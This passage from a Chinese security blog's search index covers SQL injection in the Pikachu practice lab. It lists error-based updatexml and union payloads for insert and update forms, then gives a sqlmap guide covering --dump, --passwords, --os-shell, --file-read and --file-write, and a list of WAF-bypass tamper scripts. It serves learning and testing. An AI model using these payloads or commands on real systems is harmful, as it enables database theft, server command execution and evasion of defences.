table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27;--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807172644802.png" class="" title="image-20240807172644802"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=-1%&#x27; union select 1,2,group_concat(ipaddress) from httpinfo limit 0,1--+</span><br></pre></td></tr></table></figure><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807172736060.png" class="" title="image-20240807172736060"><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>根据1’的报错判断闭合方式,确定为’)</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807191041457.png" class="" title="image-20240807191041457"><p>后续payload与前边一样，只是单引号换成’),这里就不写了。</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240807190954129.png" class="" title="image-20240807190954129"><h2 id="insert-update注入"><a href="#insert-update注入" class="headerlink" title="insert&#x2F;update注入"></a>insert&#x2F;update注入</h2><p>来到这一关，发现三个页面，一个注册界面一个登陆界面，还有一个修改个人信息界面</p><h4 id="注册界面（insert）"><a href="#注册界面（insert）" class="headerlink" title="注册界面（insert）"></a>注册界面（insert）</h4><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115043988.png" class="" title="image-20240809115043988"><p>抓个包，查看报错信息。</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115138681.png" class="" title="image-20240809115138681"><p>发现闭合时要加上括号，我们加上括号试试</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115425012.png" class="" title="image-20240809115425012"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115409015.png" class="" title="image-20240809115409015"><p>括号似乎被注释掉了，我们双写试试</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115510343.png" class="" title="image-20240809115510343"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115504010.png" class="" title="image-20240809115504010"><p>发现还是无法闭合，与后边对比，少了一个’，加上之后就不返回报错信息了，在尝试中，发现)’’和’’))也不返回报错信息，之后我们尝试注入，发现不返回报错信息</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115654303.png" class="" title="image-20240809115654303"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809115932941.png" class="" title="image-20240809115932941"><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240809120140032.png" class="" title="image-20240809120140032"><p>看看报错注入能用不能，发现不能，没有回显,如果在参数处闭合payload，会没有回显，我们把payload写在闭合符号中间，为了使语句完整，我们要在后边的闭合符号前加上and或者or</p><p>经过测试，发现之前发现的闭合符号只有’’))能用，直到我发现还有一个双引号还没试，所以正确的闭合方式其实是’’我们把payload双引号写在双引号中间，成功注入。</p><p>所以完整的流程是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#获取use()值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and&#x27;  </span><br><span class="line">                                                   #方法一(获取当前库名)</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),1，31),0x7e),1) and&#x27;     </span><br><span class="line">                                                 #方法二(获取当前所有库名)</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),1,30),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27;),1,30),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(ipaddress) from httpinfo),1,30),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">##substr在使用时，结尾数字如果是1,30的话，我们使用31,30就可以把剩余的内容显示出来</span><br></pre></td></tr></table></figure><h4 id="修改页面（update）"><a href="#修改页面（update）" class="headerlink" title="修改页面（update）"></a>修改页面（update）</h4><p>这里和之前的注册页面有一点一样的是，所有信息都必须有值才能返回报错信息，所以我们随便填点值，查看返回的报错如下。</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240818100946804.png" class="" title="image-20240818100946804"><p>最后确定单引号产生报错，双引号能够闭合，我们加入payload试试，成功获取user值，后续就简单了。</p><img src="/2024/08/07/pikachu%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/image-20240818101110508.png" class="" title="image-20240818101110508"><p>相关payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#获取use()值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+  #方法一</span><br><span class="line"></span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select schema_name from         information_schema.schemata limit 0,1),0x7e),1)--+           #方法二</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+ </span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username)) from users),1,31),0x7e),1) --+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 靶场练习 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap工具使用</title>
      <link href="/2024/08/02/sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/08/02/sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap工具使用"><a href="#sqlmap工具使用" class="headerlink" title="sqlmap工具使用"></a>sqlmap工具使用</h2><p>sqlmap 是一款开源的渗透测试工具，可以自动化进行SQL注入的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎,为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。</p><h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://example.com/sqli/?id=1</span><br><span class="line"></span><br><span class="line">#当注入点后边的参数大于或者等于两个时，需要加双引号</span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&amp;uid=2&quot;</span><br></pre></td></tr></table></figure><h3 id="判断文本中的请求是否存在注入"><a href="#判断文本中的请求是否存在注入" class="headerlink" title="判断文本中的请求是否存在注入"></a>判断文本中的请求是否存在注入</h3><p>sqlmao可以从一个文本文件中获取http请求，这样就不用设置其他参数(cookie,post，renfer等)，txt文件内容为web数据包，所以需要和bp联动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure><h3 id="查询当前用户下的所有数据库"><a href="#查询当前用户下的所有数据库" class="headerlink" title="查询当前用户下的所有数据库"></a>查询当前用户下的所有数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#加上--dbs</span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --dbs</span><br><span class="line">sqlmap.py -r 1.txt --dbs</span><br></pre></td></tr></table></figure><h3 id="获取数据库表名"><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#继续注入时，dbs缩写成D，后边加库的名称</span><br><span class="line">#加上-D 数据库名称 --tables </span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; -D 数据库名称 --tables  </span><br><span class="line">sqlmap.py -r 1.txt -D 数据库名称 --tables   </span><br></pre></td></tr></table></figure><h3 id="获取表中字段名"><a href="#获取表中字段名" class="headerlink" title="获取表中字段名"></a>获取表中字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#继续注入时，tables缩写成T，后边加表的名称</span><br><span class="line">#加上-D 数据库名称 -T 表名 --columns</span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; -D 数据库名称 -T 表名 --columns</span><br><span class="line">sqlmap.py -r 1.txt -D 数据库名称 -T 表名 --columns</span><br></pre></td></tr></table></figure><h3 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#继续注入时，columns缩写成C，后边加字段的名称</span><br><span class="line">#参数加上-c 字段名 --dump</span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; -D 数据库名称 -T 表名 -c 字段名 --dump</span><br><span class="line">sqlmap.py -r 1.txt -D 数据库名称 -T 表名 -c 字段名 --dump</span><br></pre></td></tr></table></figure><h3 id="获取数据库所有用户"><a href="#获取数据库所有用户" class="headerlink" title="获取数据库所有用户"></a>获取数据库所有用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --users</span><br><span class="line">sqlmap.py -r 1.txt --users</span><br></pre></td></tr></table></figure><h3 id="获取数据库用户密码"><a href="#获取数据库用户密码" class="headerlink" title="获取数据库用户密码"></a>获取数据库用户密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --passwords</span><br><span class="line">sqlmap.py -r 1.txt --passwords</span><br></pre></td></tr></table></figure><h3 id="获取当前数据库名称"><a href="#获取当前数据库名称" class="headerlink" title="获取当前数据库名称"></a>获取当前数据库名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --current-db</span><br><span class="line">sqlmap.py -r 1.txt --current-db</span><br></pre></td></tr></table></figure><h3 id="获取当前网站数据库用户名称"><a href="#获取当前网站数据库用户名称" class="headerlink" title="获取当前网站数据库用户名称"></a>获取当前网站数据库用户名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --current-user</span><br><span class="line">sqlmap.py -r 1.txt --current-user</span><br></pre></td></tr></table></figure><h2 id="更多参数详解"><a href="#更多参数详解" class="headerlink" title="更多参数详解"></a>更多参数详解</h2><h3 id="–lever-5：探测等级"><a href="#–lever-5：探测等级" class="headerlink" title="–lever 5：探测等级"></a>–lever 5：探测等级</h3><p>sqlmap一共五个等级，也可以不加，默认是1，sqlmap的payload可以在xml&#x2F;payloads.xml中看到，也可以根据相应的格式添加自己的payload，其中五级包含的payload最多，会自动破解cookie，XFF等头部注入，当然随着等级的提高速度也会变慢，（具体参考相关路径payload或者官方文档）</p><h3 id="–is-dba：当前用户是否为管理员权限"><a href="#–is-dba：当前用户是否为管理员权限" class="headerlink" title="–is-dba：当前用户是否为管理员权限"></a>–is-dba：当前用户是否为管理员权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#返回结果为true或false</span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --is-dba</span><br></pre></td></tr></table></figure><h3 id="–roles：列出数据库管理员角色"><a href="#–roles：列出数据库管理员角色" class="headerlink" title="–roles：列出数据库管理员角色"></a>–roles：列出数据库管理员角色</h3><p>如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-u参数指定想看那个用户的角色吗，（该命令只适用于数据库时Oracle时）</p><h3 id="–referer"><a href="#–referer" class="headerlink" title="–referer"></a>–referer</h3><p>可以伪造http中的referer，当level参数设定为3或3以上时，会尝试对referer注入。也可以尝试referer欺骗，如–referer <a href="http://www.baidu.com/">http://www.baidu.com</a></p><h3 id="–sql-shell：运行自定义SQL语句"><a href="#–sql-shell：运行自定义SQL语句" class="headerlink" title="–sql-shell：运行自定义SQL语句"></a>–sql-shell：运行自定义SQL语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --sql-shell </span><br></pre></td></tr></table></figure><p>进入sql-shell面板，在面板中输入想要使用的查询语句</p><h3 id="–os-cmd-–os-shell：运行任意操作系统命令"><a href="#–os-cmd-–os-shell：运行任意操作系统命令" class="headerlink" title="–os-cmd,–os-shell：运行任意操作系统命令"></a>–os-cmd,–os-shell：运行任意操作系统命令</h3><h4 id="–os-cmd"><a href="#–os-cmd" class="headerlink" title="–os-cmd"></a>–os-cmd</h4><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，且有用户权限使用特定函数时，可以使用参数“–os-cmd”执行系统命令。</p><p>如果数据库为MySQL或PostgreSQL，则SQLLmap会上传一个二进制库，包含用户自定义的函数sys_exec()和sys_eval(),通过创建的这两个函数可以执行系统命令。</p><p>如果数据库为Microsoft SQL Server，则sqlmap会使用xp_cmdshell存储过程执行系统命令，如果</p><p>xp_cmdshell被禁用（Microsoft SQL Server 2005版本以上默认被禁用），则sqlmap会重新启用它；如果xp_cmdshell不存在，则sqlmap会创建它。</p><h4 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h4><p>使用参数“–os-shell”可以模拟一个真实的shell，与服务器进行交互，当不能执行多语句时（如php或asp的后端数据库为MySQL），sqlmap可以通过select语句中的into outfile在web服务器的可写目录中船舰web后门，从而执行命令。参数“–os-shell”支持asp，aspnet，jsp和php四种语言。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--os-shell的执行条件有三个:</span><br><span class="line"></span><br><span class="line">（1）网站必须是root权限</span><br><span class="line"></span><br><span class="line">（2）攻击者需要知道网站的绝对路径</span><br><span class="line"></span><br><span class="line">（3）GPC为off，php主动转义的功能关闭</span><br></pre></td></tr></table></figure><h3 id="–file-read：从数据库服务器中读取执行文件"><a href="#–file-read：从数据库服务器中读取执行文件" class="headerlink" title="–file-read：从数据库服务器中读取执行文件"></a>–file-read：从数据库服务器中读取执行文件</h3><p>该命令用于从该服务器中读取可执行文件，当数据库为mysql，postgresql或microsoft sql server，并且当前用户有权限使用特定函数时，读取的文件可以是文本，也可以是二进制文件。</p><p>命令示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://example.com/?id=1 --file-read &quot;/etc/password&quot; -v 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-v 0：静默模式，只输出关键信息和警告。这是最少输出的模式，适合在生产环境或需要最小干扰的情况下使用。</span><br><span class="line"></span><br><span class="line">-v 1：基本模式，输出一些基本的信息和警告。这个级别通常用于常规的安全测试和漏洞评估。</span><br><span class="line"></span><br><span class="line">-v 2：详细模式，输出更多详细的信息，包括请求和响应的数据。适用于深入的漏洞分析和调试。</span><br><span class="line"></span><br><span class="line">-v 3：调试模式，输出大量的调试信息，非常详细。主要用于开发和排查问题。</span><br><span class="line"></span><br><span class="line">-v 4、-v 5、-v 6：这些级别输出的信息更加详细和深入，通常用于极端情况下的分析和调试。</span><br></pre></td></tr></table></figure><h3 id="–file-write和–file-dest：将本地文件写入数据库服务器"><a href="#–file-write和–file-dest：将本地文件写入数据库服务器" class="headerlink" title="–file-write和–file-dest：将本地文件写入数据库服务器"></a>–file-write和–file-dest：将本地文件写入数据库服务器</h3><p>用于将本地文件写入数据库服务器，当数据库为MySQL，PostgreSQL或Microsoft SQL Server，且有用户权限使用特定函数时，上传文件可以是文本也可以是二进制文件。</p><p>命令示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://example.com/?id=1 --file-write &quot;1.txt&quot; --file-dest &quot;/tmp/1.txt&quot; -v 1</span><br></pre></td></tr></table></figure><h2 id="sqlmap自带tamper绕过脚本讲解"><a href="#sqlmap自带tamper绕过脚本讲解" class="headerlink" title="sqlmap自带tamper绕过脚本讲解"></a>sqlmap自带tamper绕过脚本讲解</h2><p>为了防止诸如语句中出现单引号，sqlmap默认情况下会使用CHAR()函数。可以使用参数“–tamper”对数据作修改来绕过waf等设备，其中大部分脚本主要使用正则模块替换payload字符编码的方式尝试绕过waf的检测规则，命令示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py xxxx --tamper &quot;模块名&quot;</span><br></pre></td></tr></table></figure><p>日常使用我们会对一些网站是否有安全防护进行试探，使用参数”–identify-waf”进行检测</p><h3 id="常用tamper绕过脚本"><a href="#常用tamper绕过脚本" class="headerlink" title="常用tamper绕过脚本"></a>常用tamper绕过脚本</h3><p>（1）apostrophemask.py</p><p>作用：将引号替换为UTF-8格式，用于过滤单引号</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 AND %EF%BC%871%EF%BC%87=%EF+BC%871   #这是全角单引号的UTF-8编码</span><br><span class="line">1 AND %271%27=%271         #正常英文单引号的UTF-8编码</span><br></pre></td></tr></table></figure><p>（2）base64encode.py</p><p>作用：将请求参数进行base64位编码</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and SLEEP(5)#</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MScgYW5kIFNMRUVQKDUpIw==</span><br></pre></td></tr></table></figure><p>（3）multiplespaces.py</p><p>作用：在SQL语句的关键字中间添加多个空格</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT foobar</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1   UNION   SELECT   foobar</span><br></pre></td></tr></table></figure><p>（4）space2plus.py</p><p>作用：用加号（+）替换空格</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT+id+FROM+users</span><br></pre></td></tr></table></figure><p>（5）nonrecursivereplacement.py</p><p>作用：作为双重查询语句，用双重语句替换预定义的SQL关键字（适用于非常弱的自定义过滤器，例如将”select”替换为空）</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT 2--</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNIOUNIONN SELESELECTCT 2--</span><br></pre></td></tr></table></figure><p>（6）space2randomblank.py</p><p>作用：将空格替换为其他有效字符，例如%09，%0A，%0C，%0D</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT%0Did%0DFROM%0Dusers</span><br></pre></td></tr></table></figure><p>（7）unionalltounion.py</p><p>作用：将”UNION ALL AELECT”替换为”UNION SELECT”</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 UNION ALL AELECT</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 UNION SELECT</span><br></pre></td></tr></table></figure><p>（8）securesphere.py</p><p>作用：追加特制的字符串</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 and &#x27;0having&#x27;=&#x27;0having&#x27;</span><br></pre></td></tr></table></figure><p>（9）space2hash.py</p><p>作用：将空格替换为井字号（#），并添加一个随机字符串和换行符</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%23nVNaVoPYeva%023ngNvzqu%0A9227=9227</span><br></pre></td></tr></table></figure><p>（10）space2mssqlblank.py</p><p>作用：将空格替换为其他空符号</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT%0Eid%0DFROM%07users</span><br></pre></td></tr></table></figure><p>（11）space2mssqlhash.py</p><p>作用：将空格替换为井字号（#），并添加换行符</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%23%0AAnd%23%0A9227=9227</span><br></pre></td></tr></table></figure><p>（12）between.py</p><p>作用：用“NOT VETWEEN 0 AND”替换大于号（&gt;），用“BETWEEN AND”替换等号（&#x3D;）</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B--</span><br><span class="line">1 AND A = B--</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 ADN A NOT BETWEEN 0 AND B--</span><br><span class="line">1 ADN A BETWEEN B AND B--</span><br></pre></td></tr></table></figure><p>（13）percentage.py</p><p>作用：ASP语言允许在每个字符前加上一个百分号（%）</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%S%E%L%E%C%T%F%I%E%L%D%F%R%O%M%T%A%B%L%E</span><br></pre></td></tr></table></figure><p>（14）sp_password.py</p><p>作用：将sp_password.py追加到Payload末尾</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227--</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227-- sp_password.py</span><br></pre></td></tr></table></figure><p>（15）charencode.py</p><p>作用：对给定Payload全部字符使用URL编码（不处理已经编码的字符）</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</span><br></pre></td></tr></table></figure><p>（16）randomcase.py</p><p>作用：在sql语句中，对关键字进行随机大小写转换</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InsERt</span><br></pre></td></tr></table></figure><p>（17）charunicodeencode.py</p><p>作用：对sql语句进行字符串unicode编码</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td 